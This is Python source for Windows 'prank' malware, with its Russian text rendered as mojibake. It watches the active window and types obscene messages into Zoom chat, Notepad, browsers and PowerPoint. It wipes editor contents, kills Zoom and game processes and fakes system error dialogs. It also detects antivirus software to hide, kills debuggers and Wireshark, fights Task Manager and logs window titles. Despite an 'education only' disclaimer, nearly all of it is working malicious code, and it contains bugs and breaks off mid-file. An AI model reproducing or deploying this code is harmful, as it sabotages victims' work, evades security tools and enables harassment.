"""
–°–ø–∞—Å–∏–±–æ –≤—Å–µ–º —Å–æ–∑–¥–∞—Ç–µ–ª—è–º –±–∏–±–ª–∏–æ—Ç–µ–∫, –Ω–∞ –∫–æ—Ç–æ—Ä—ã—Ö —ç—Ç–∞ –ø—Ä–æ–≥–∞ –¥–µ—Ä–∂–∏—Ç—Å—è.

–≠—Ç–æ—Ç –∫–æ–¥ - –ø–æ–ª–Ω–æ–µ  –≥–æ–≤–Ω–æ.

–¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è!


–ó–∞–ø—É—Å–∫–∞–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –≤–∏—Ä—Ç—É–∞–ª–∫–∞—Ö.
–ù—É –ø–æ–∂–∞–ª—É–π—Å—Ç–∞:(
"""
with open("logprank.txt", "a") as logi:
    logi.write("–ó–∞–ø—É—Å–∫....")

from pynput.keyboard import Controller, Key
def writekeyboard(text, delay=0.05):
    """–ù–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–π –ø–∏–∑–¥–µ—Ü –¥–ª—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã"""
    keyboard = Controller() # –ö–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä –∫–ª–∞–≤—ã
    for char in text:
        try:
            keyboard.press(char)
            keyboard.release(char)
        except ValueError:
            if char == ' ':
                keyboard.press(Key.space)
                keyboard.release(Key.space)
            time.sleep(delay)
    keyboard.press(Key.enter)
    time.sleep(0.05)
    keyboard.release(Key.enter)






           






import os
import ctypes
import pyautogui
import time
import random
import tkinter as tk
from tkinter import messagebox, simpledialog, scrolledtext
import threading
import shutil
import msvcrt
import hashlib
import pygetwindow as gw
import sys
import pyperclip
import pyttsx3
import queue
from PIL import Image
import psutil


    


# Global tkinter root for GUI operations
tk_root = None
gui_queue = queue.Queue()

def init_tkinter():
    """Initialize tkinter root window for GUI operations"""
    global tk_root
    if tk_root is None:
        tk_root = tk.Tk()
        tk_root.withdraw()  # Hide the root window
        tk_root.attributes('-topmost', True)  # Keep it on top when needed

def process_gui_queue():
    """Process GUI operations from the queue"""
    try:
        while True:
            operation = gui_queue.get_nowait()
            if operation['type'] == 'showwarning':
                messagebox.showwarning(operation['title'], operation['message'])
            elif operation['type'] == 'showerror':
                messagebox.showerror(operation['title'], operation['message'])
            elif operation['type'] == 'showinfo':
                messagebox.showinfo(operation['title'], operation['message'])
            elif operation['type'] == 'askstring':
                # For askstring, we need to handle the return value differently
                result = simpledialog.askstring(operation['title'], operation['prompt'])
                if operation.get('callback'):
                    operation['callback'](result)
    except queue.Empty:
        pass

    

def show_warning_gui(title, message):
    """Thread-safe way to show warning"""
    gui_queue.put({
        'type': 'showwarning',
        'title': title,
        'message': message
    })

def show_error_gui(title, message):
    """Thread-safe way to show error"""
    gui_queue.put({
        'type': 'showerror',
        'title': title,
        'message': message
    })

def show_info_gui(title, message):
    """Thread-safe way to show info"""
    gui_queue.put({
        'type': 'showinfo',
        'title': title,
        'message': message
    })

# Global variables
arta = False

def ekaterinburgskie_penisi(penis, ekaterinburg):
    """–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã."""
    if penis > 3:
        print("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
    elif penis < 3:
        print("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
        logger("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
    elif penis < 6:
        print("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
        logger("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
        messagebox.showinfo("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "–î–æ—Å—Ç–∞–≤–∫–∞ –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏—Ö –ü–µ–Ω–∏—Å–æ–≤!")
        messagebox.showwarning("–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ!!!", "–î–æ—Å—Ç–∞–≤–∫–∞ –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏—Ö –ø–µ–Ω–∏—Å–æ–≤ –ø—Ä–∏–±—ã–ª–∞!")
        messagebox.showerror("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ø–µ–Ω–∏—Å—ã!!!", "–ï–ö–ê–¢–ï–†–ò–ù–ë–£–†–ì–°–ö–ò–ï –ü–ï–ù–ò–°–´!")
    elif penis < 10:
        print("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
        logger("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ü–µ–Ω–∏—Å—ã!")
        messagebox.showinfo("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "–î–æ—Å—Ç–∞–≤–∫–∞ –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏—Ö –ü–µ–Ω–∏—Å–æ–≤!")
        messagebox.showwarning("–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ!!!", "–î–æ—Å—Ç–∞–≤–∫–∞ –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏—Ö –ø–µ–Ω–∏—Å–æ–≤ –ø—Ä–∏–±—ã–ª–∞!")
        messagebox.showerror("–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ø–µ–Ω–∏—Å—ã!!!", "–ï–ö–ê–¢–ï–†–ò–ù–ë–£–†–ì–°–ö–ò–ï –ü–ï–ù–ò–°–´!")
        copyonwrite("–ê –≤—ã —É–∂–µ –ø—Ä–æ–±–æ–≤–∞–ª–∏ –ù–æ–≤—ã–π —Ç—Ä–µ–Ω–¥? –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏–µ –ø–µ–Ω–∏—Å—ã - —Ö–∏—Ç –≤—Å–µ–≥–æ —Ç–∏–∫—Ç–æ–∫–∞! –ó–∞–∫–∞–∂–∏—Ç–µ, —è –ø—Ä–æ–±–æ–≤–∞–ª–∞, —Ç–∞–∫ –≤–∫—É—Å–Ω–æ!")
        pyautogui.press("enter")

    elif penis < 100:
        logger("–ê–≤–∞—Ä–∏–π–Ω—ã–π –í—ã—Ö–æ–¥ –ò–∑–∑–∞ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–≥–æ —É—Ä–æ–≤–Ω—è –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥—Å–∫–∏—Ö –ø–µ–Ω–∏—Å–æ–≤!!!!")
        global running
        running = False
        exit(1)
    else:
        logger("–ù–µ—Ç, —Å—Ç—Ä–æ–∫—É –Ω–µ–ª—å—è —é–∑–∞—Ç—å. —Ç–æ–ª—å–∫–æ int")
        pass
    if ekaterinburg != 90:
        logger("–Ω–µ —É–≥–∞–¥–∞–ª")
    else:
        logger("–£–≥–∞–¥–∞–ª!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")




    



def logger(towrite):
    try:
        # Ensure towrite is a string
        if not isinstance(towrite, str):
            towrite = str(towrite)

        # Write without encoding
        with open("logprank.txt", "a") as log:
            log.write(f"{time.ctime()} - {towrite}\n")
    except Exception as e:
        # If fails, print to console
        print(f"Logger failed: {towrite}, –ü—Ä–∏—á–∏–Ω–∞: {e}")
    return towrite
logger("—á—Ç–æ?")
logger("logger: logger init succesfull")
def check_passwd():
    origpasswdhashsha256 = "475f86b9ac52c105d35f422ac8bba707b833e482c9c7dcdf718c62e37c2a1794"
    userpasswd–¥ = simpledialog.askstring("–í–≤–æ–¥ –ø–∞—Ä–æ–ª—å", "–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—ã")
    def hash_password(password):
                  hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
                  return hashed
    hasheduserpasswd = hash_password(userpasswd–¥)
    if hasheduserpasswd == origpasswdhashsha256:
        pass
    else:
        logger("–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–∞—Ä–æ–ª—å!")
        print("ACCES DENIED")
        say("ACCES DENIED!!!")
        say("–î–û–°–¢–£–ü –ó–ê–ü–†–ï–©–ï–ù")
        messagebox.showerror("Error", "PERMISSION DENIED!!!")
        sys.exit(1)
        exit(2)
        exit(2) # –¢—Ä–∏ —Ä–∞–∑–∞ - –Ω–∞–¥–µ–∂–Ω–æ!(–Ω–µ—Ç)


            



def say(say):
        try:
            # Sanitize text for TTS engine
            if not isinstance(say, str):
                say = str(say)

            # Remove or replace problematic Unicode characters for TTS
            sanitized_say = say.encode('utf-8', errors='replace').decode('utf-8')

            engine = pyttsx3.init()
            engine.say(sanitized_say)
            engine.runAndWait()
            logger(f"üîä–û–∑–≤—É—á–µ–Ω–æ: {sanitized_say}")
        except Exception as e:
            logger(f"–û—à–∏–±–∫–∞ –æ–∑–≤—É—á–∏–≤–∞–Ω–∏—è: {e}")
            # Fallback without emoji
            try:
                fallback_text = say.encode('ascii', errors='ignore').decode('ascii')
                if fallback_text.strip():
                    engine = pyttsx3.init()
                    engine.say(fallback_text)
                    engine.runAndWait()
                    logger(f"üîä–û–∑–≤—É—á–µ–Ω–æ (fallback): {fallback_text}")
            except:
                logger("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–∑–≤—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç")

def opencart(cart):
    image = Image.open(cart)
    image.show()
    logger(f"–ü–æ–∫–∞–∑–∞–Ω–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ!: {image} ")



# –°–ø–∏—Å–æ–∫ —Ü–µ–ª–µ–≤—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
target_apps = [
    "word", "excel", "notepad", "–±–ª–æ–∫–Ω–æ—Ç",
    "telegram", "whatsapp", "discord", "slack", "teams", "—á–∞—Ç", "chat",
    "Visual Studio Code", "vscode", "Code",
    "–Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä", "yandex browser", "yandex", "main.py", "init.py", "python"
]

def detect_target_application():
    """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç, —Ä–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏"""
    try:
        active_window = gw.getActiveWindow()
        if active_window and active_window.title:
            title = active_window.title.lower()
            for app in target_apps:
                if app in title:
                    return True, active_window.title
        return False, None
    except:
        return False, None
def copyonwrite(towrite):
    pyperclip.copy(towrite)
    pyautogui.hotkey("ctrl", "v")

def perform_sabotage(window_title):
    """–í—ã–ø–æ–ª–Ω—è–µ—Ç —Å–∞–±–æ—Ç–∞–∂ –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏"""


    try:
        # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –æ–∫–Ω–æ
        window = gw.getWindowsWithTitle(window_title)[0]
        window.activate()
        say("–•–ï–•–•–ï–•–ï–•–ï–•–ï–•–ï–•–ï–•–ï–•–ï–•–•–ï–•–ï–ï–ï–ï–ï–ï–ï–ï–ï–ï–•–ï–•–ï–•–ï–•–ï–•–•–ï–•–ï–•–ï–•–•–ï–•–ï–•–ï–•–ï–•–ï–•–ï–•–•–ï–•–•–ï")


        time.sleep(1)
        if "Zoom Workplace" in window_title or "Zoom" in window_title:
            time.sleep(90)
            pyautogui.rightClick()
            messagebox.showerror("–û—à–∏–±–∫–∞!", "–ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–∞—è –æ—à–∏–±–∫–∞! –î–ª—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è –æ—Ç–∫—Ä–æ–π—Ç–µ —á–∞—Ç zoom –≤ –∫–æ–Ω—Ñ–µ—Ä–µ–Ω—Ü–∏–∏ –∏ –Ω–∞–≤–µ–ª–∏—Ç–µ –∫—É—Ä—Å–æ—Ä –∫–∞–∫ –µ—Å–ª–∏ –±—ã –≤—ã –ø–∏—Å–∞–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ, –∏ –ø–æ–¥–æ–∂–¥–∏—Ç–µ 20 —Å–µ–∫—É–Ω–¥")
            time.sleep(8)
            writekeyboard("–ü—Ä–æ—Å—Ç–∏—Ç–µ, —É—á–∏—Ç–µ–ª—å–Ω–∏—Ü–∞. –Ø –æ–±–∫–∞–∫–∞–ª—Å—è –ø—Ä—è–º–æ –Ω–∞ —É—Ä–æ–∫–µ! –ú–æ–∂–Ω–æ –æ—Ç–æ–π—Ç–∏? –Ø –æ—á–µ–Ω—å —Å–∏–ª—å–Ω–æ –Ω–∞–ø–æ–Ω–æ—Å–∏–ª!")

            pyautogui.press("enter")
            os.system("taskkill /f /im Zoom.exe")
            messagebox.showerror("–û—à–∏–±–∫–∞ Zoom", "Zoom –ó–∞–∫—Ä—ã–ª—Å—è –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏ –≤ –ø–∞–º—è—Ç–∏.")
            say("I will always be a villiain. HUHUHUHUHUHUHU!") # –Ø –≤—Å–µ–≥–¥–∞ –±—É–¥—É –∑–ª–æ–¥–µ–µ–º. –í–£–ê–•–ê–•–ê–•–ê–•–ê–•–ê–•–ê–•!
            user32.ShowCursor(False)
            time.sleep(30)
            user32.ShowCursor(True)

            global running
            running = False

            
            exit(1) # –ó–∞–º–µ—Ç–∞–µ–º  –°–ª–µ–¥—ã. –í–£–•–ê–•–•–ê–•–ê–•–ê–•–ê!
        if "–ë–ª–æ–∫–Ω–æ—Ç" in window_title or "–í–∞–∂–Ω–æ–µ.txt" in window_title:
            copyonwrite(towrite="–ü—É–∫–∞–ª–∞ –º—É–∫–æ–π –Ω–∞–∫–∞–∫–∞–ª–∞ –ø–æ–Ω–æ—Å–æ–º –¥–∏—Å–∫–æ—Ç–µ–∫–∞ –∞–Ω–∞–ª—å–Ω–æ–≥–æ –≤–µ–∫–∞ –ú–ë–û–£ –°–û–® –∏–º–µ–Ω–∏ ‚Ññ6 –ø–æ–∫–∞–∫–∞–ª–∞ –Ω–∞ —É—á–∏–ª–∫—É:*(((–±–ª—è—Ç—å)))–æ–±–∫–∞–∫–∞–ª–∏—Å—å –º—ã –ù–ï–ï–ï–ï–¢–±–∞–∏–ª—å –±—É–ª—å–±—É–ª—å–±—É–ª—å –∫–∞–∫–∞—à–∫—É –∫—É–ø–∏–ª")
            logger(f"–°–ø–µ—Ü —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è –±–ª–æ–∫–Ω–æ—Ç–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω!")

        if "rutracker.org" in window_title:
            messagebox.showinfo("–ê–≥–∞!", "–ü–æ–ø–∞–ª—Å—è, –ø–∏—Ä–∞—Ç?")
            pyautogui.moveTo(162, 5547)
            pyautogui.click()


            

        



        # –°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–π —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è Visual Studio Code
        if "Visual Studio Code" in window_title or "vscode" in window_title.lower() or "code" in window_title.lower():
            # –í–≤–æ–¥–∏–º –º—É—Å–æ—Ä–Ω—ã–π –∫–æ–¥ –∏ —É–¥–∞–ª—è–µ–º
            pyautogui.write("print('–ö–æ–¥ –º—É—Å–æ—Ä! –•–∞-—Ö–∞!')", interval=0.05)
            time.sleep(1)
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press('delete')
            logger(f"–°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–π —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è VS Code –≤—ã–ø–æ–ª–Ω–µ–Ω –≤: {window_title}")
            return

        # –°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–π —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è –Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä–∞
        if "–Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä" in window_title or "yandex browser" in window_title.lower() or "yandex" in window_title.lower():
            logger(f"–¶–µ–ª—å –∑–∞—Ö–≤–∞—á–µ–Ω–∞: {window_title} ")
            logger("–ù–∞—á–∞—Ç –°–∞–±–æ—Ç–∞–∂!!!")
            sabotagetext = "–ß—Ç–æ —Ç–∞–∫–æ–µ –∫–∞–∫–∞–ª–∞"
            pyperclip.copy(sabotagetext)
            pyautogui.hotkey("ctrl", "v")
            pyautogui.press('enter')
            time.sleep(20)
            pyautogui.hotkey("ctrl", "w")
            time.sleep(2)
            pyautogui.hotkey("ctrl", "t")
            pyautogui.MoveTo(1908, 153)
            time.sleep(1)
            pyautogui.click()


            pyautogui.scroll(-200)

            logger(f"–°–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏–π —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è –Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω –≤: {window_title}")
            return

        # –°–ø–µ—Ü —Å–∞–±–æ—Ç–∞–∂ –¥–ª—è explorer
        if "–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª" in window_title or "Desktop"  in window_title or "–ü—Ä–æ–≤–æ–¥–Ω–∏–∫" in window_title:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            name = random.choice(["–û–±—Ñ–µ—Ä–¥–µ–ª–∞—Å—å?", "–ø–æ–¥–æ—Å—Ä–∞–ª–∞?", "–ø—Ä–∏—Å—Ä–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ", "–í–ê–ê–•–ê–•–ê–•–ê–•–ê–• —Å–∞–±–æ—Ç–∞–∂!"])
            full_path = os.path.join(desktop, name)
            os.makedirs(full_path, exist_ok=True)
            filepath = os.path.join(full_path, "–≤–Ω–∏–º–∞–Ω–∏–µ!")
            with open(filepath, "w") as k:
                k.write("–ü—Ä–∏–Ω–∏–º–∞–π —Å–∞–º–æ–≤–∞—Ä!\n SYSTEM COMPROMISED\n BREEEEEEEEEEE")
                k.write("sorry")
            pyautogui.MoveTo(704, 5957)
            pyautogui.doubleClick()
            pyautogui.rightClick()


            logger("–°–∞–±–æ—Ç–∞–∂ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —É—Å–ø–µ—à–µ–Ω\n")
        if "PowerPoint" in window_title or "Powerpoint" in window_title:
            time.sleep(40)
            pyautogui.hotkey("ctrl", "s")
            user32 = ctypes.windll.user32
            user32.ShowCursor(False)
            time.sleep(0.5)
            for _ in range(50):
                user32.ShowCursor(False)
                time.sleep(0.1)
                user32.ShowCursor(True)

        


                

                time.sleep(0.1)
            user32.ShowCursor(True)
            pyautogui.write("–î–∏—Å—Å–µ—Ä—Ç–∞—Ü–∏—è –Ω–∞ —Ç–µ–º—É <–ö–∞–ª–æ–≤—ã–µ –º–∞—Å—Å–æ–Ω—ã –∏ –∏—Ö –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ>")
            say("–°–ê–ë–û–¢–ê–ñ")
            messagebox.showerror("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞", "–ö–∞–ª –Ω–µ –∫–∞–ª")

            user32.ShowCursor(True)
            pyautogui.press("left")
            time.sleep(20)
            pyautogui.hotkey('ctrl', 'i')
            time.sleep(0.5)
            pyautogui.write('PRANKED AHAHAHAHA')

            logger("–°–∞–±–æ—Ç–∞–∂ –ø–æ–≤–µ—Ä–ø–æ–∏–Ω—Ç–∞ —É—Å–ø–µ—à–µ–Ω!")

            

        import psutil
        game_target = ["cs2.exe", "dota2.exe", "game.exe", "pubg.exe", "rust.exe", "fifa.exe", "fortnite.exe", "worldoftanks.exe", "cyberpunk2077.exe"]
        def killgame():
            killed = 0
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if proc_name in game_target:
                        proc.kill()
                        killed += 1
                        logger(f"–∏–≥—Ä–∞ —É–±–∏—Ç–∞: {proc_name}")
                except:
                    continue
                return killed
            while running:
                killgame()
                time.sleep(60)





        # –í–≤–æ–¥–∏–º —Å–∞–±–æ—Ç–∞–∂–Ω—ã–π —Ç–µ–∫—Å—Ç —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–∏
        sabotage_text = "–ö–†–û–ö–û–î–ò–õ–õ–ê–î–£–î–£–î–¶ –ö–ê–ö–ê–ö–ê–®–ö–ê–ö–®–ö–ê–ö"
        # Sanitize text for pyautogui
        try:
            sanitized_text = sabotage_text.encode('utf-8', errors='replace').decode('utf-8')
            pyautogui.write(sanitized_text, interval=0.05)
        except Exception as write_error:
            # Fallback to ASCII-only text
            fallback_text = sabotage_text.encode('ascii', errors='ignore').decode('ascii')
            if fallback_text.strip():
                pyperclip.copy(fallback_text)
                pyautogui.hotkey("ctrl", "v")
            

            else:
                pyautogui.write("SYSTEM COMPROMISED", interval=0.05)
            logger(f"–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω fallback —Ç–µ–∫—Å—Ç –¥–ª—è —Å–∞–±–æ—Ç–∞–∂–∞: {fallback_text}")

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º (—Ä–∞–∑–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º)
        if "word" in window_title.lower() or "excel" in window_title.lower():
            pyautogui.hotkey('ctrl', 's')  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ Office
        else:
            pyautogui.hotkey('ctrl', 's')  # –ü—Ä–æ–±—É–µ–º —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å

        logger(f"–°–∞–±–æ—Ç—Ä–∞–∂ –≤—ã–ø–æ–ª–Ω–µ–Ω –≤: {window_title}")
    except Exception as e:
        logger(f"–û—à–∏–±–∫–∞ —Å–∞–±–æ—Ç–∞–∂–∞: {e}")

def protection():
    try:
        from ctypes import wintypes
        logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –£—Å–ø–µ—à–Ω—ã–π –∑–∞–ø—É—Å–∫.")
        logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...")
        # —Å–¥–µ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.IsDebuggerPresent.restype = wintypes.BOOL
        kernel32.IsDebuggerPresent.argtypes = []

        logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –£—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ ")
        logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –û—Ç–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ç–æ–∫ –∞–Ω—Ç–∏-taskmgr")
        anti_taskmgr = threading.Thread(target=anti_taskmgr_thread, daemon=True)
        anti_taskmgr.start()
        def isdebbuger():
            try:
                return bool(ctypes.windll.kernel32.IsDebuggerPresent())
            except:
                return False

        # –°–ø–∏—Å–æ–∫ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
        antivirus_processes = ['avast.exe', 'kaspersky.exe', 'eset.exe', 'mcafee.exe', 'norton.exe', 'bitdefender.exe', 'defender.exe', 'avg.exe', 'avira.exe', 'trendmicro.exe', 'panda.exe', 'comodo.exe', 'f-secure.exe', 'sophos.exe', 'webroot.exe', 'malwarebytes.exe', 'drweb.exe', 'gdata.exe']
        running_critical = True
        while running_critical:
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if proc_name in antivirus_processes:
                        av_name = proc.info['name']
                        
                        logger(f"–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: kernel panic - –û–±–Ω–∞—Ä—É–∂–µ–Ω {av_name}. –ê–∫—Ç–∏–≤–∏—Ä—É—é –°—Ç–µ–ª—Å –∏ –∞–≤–∞—Ä–∏–π–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –≤—Å—é –ø—Ä–æ–≥—É...")
                        global running
                        global arta
                        arta = True
                        running = False
                        
                        break  # –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ü–∏–∫–ª–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
                except Exception as e:
                    logger(f"–°–∏—Å—Ç–µ–º–∞ –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ PlatfPo: –ê–Ω—Ç–∏–ê–Ω—Ç–∏–ù–µ–¥–æ–≤–∏—Ä—É—Å: –û—à–∏–±–∫–∞: {e} ")

                    pass

            if running:
                if isdebbuger():

                    if running == True:
                        pass
                    else:
                        break
                    
                

                    logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –¢–†–ï–í–û–ì–ê! –û–ë–ù–ê–†–£–ñ–ï–ù –î–ï–ë–ê–ì–ï–†!!!–ê–ö–¢–ò–í–ò–†–£–Æ –ó–ê–©–ò–¢–£!")
                    ekaterinburgskie_penisi(penis=50, ekaterinburg=90)
                    start_chaos()
                    messagebox.showerror("–ü–æ–ø–∞–ª—Å—è!", "–î–µ–±–∞–≥–µ—Ä—ã –∑–∞–ø—Ä–µ—â–µ–Ω—ã.")
                
                    logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –£–≥—Ä–æ–∑–∞ –Ω–µ —Ç–æ—á–Ω–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∞, –Ω–æ –º—ã –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å.")

                else:
                    logger("–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –î–µ–±–∞–≥–µ—Ä—ã –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã.")
                def copy_backup(filetocopy):
                    if not os.path.exists("backups"):
                        os.makedirs("backups")
                    filename = os.path.basename(filetocopy)
                    destiinatiion = os.path.join("backups", filename)
                    shutil.copy2(filetocopy, destiinatiion)
                    logger(f"–§–∞–π–ª {filetocopy} —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ {destiinatiion} ")

                copy_backup("prankforme.py")
                # More protection: Check for other suspicious processes
                suspicious_processes = ['ollydbg.exe', 'x64dbg.exe', 'processhacker.exe', 'cheatengine.exe', 'wireshark.exe', 'fiddler.exe', "x32dbg.exe"]
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in suspicious_processes:
                            messagebox.showerror("System Error", f"{proc.info['name']} has encountered a problem and needs to close.")
                            proc.kill()
                            logger(f"–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –£–±–∏—Ç –ü—Ä–æ—Ü–µ—Å—Å –¥–µ–±–∞–≥–µ—Ä–∞: {proc.info['name']}")
                    except:
                        pass
                time.sleep(30)  # Check every 30 seconds to avoid overloading
                # Log user actions: active window
                try:
                    active_window = gw.getActiveWindow()
                    if active_window and active_window.title:
                        logger(f"–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –æ—Ç–∫—Ä—ã—Ç—ã–µ –æ–∫–Ω–∞: {active_window.title}")
                except:
                    pass
            else:
                # –í —Å—Ç–µ–ª—Å-—Ä–µ–∂–∏–º–µ —Ç–æ–ª—å–∫–æ –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã, –±–µ–∑ –¥—Ä—É–≥–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π
                time.sleep(30)



                



    except Exception as e:

        logger(f"–ó–∞—â–∏—Ç–Ω–∏–∫ –°–∏—Å—Ç–µ–º—ã PlatfPo: –û—à–∏–±–∫–∞: {e}")

def start_chaos():
